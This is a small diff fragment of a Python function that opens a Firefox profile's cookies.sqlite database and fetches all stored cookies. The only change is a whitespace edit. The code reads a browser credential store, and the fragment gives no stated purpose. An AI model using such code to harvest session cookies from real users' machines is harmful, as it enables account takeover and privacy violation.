@@ -13,7 +13,7 @@ def get_cookie():
 
 	try:
 		db = f'{Path.home()}/.mozilla/firefox/v69ttedg.default-release/cookies.sqlite'
-		con = sqlite3.connect(db, timeout=3)
+		con = sqlite3.connect(db, timeout=3)	
 		cursor = con.cursor()
 		query_cookies = cursor.execute('SELECT * from moz_cookies')
 		get_cookies = query_cookies.fetchall()
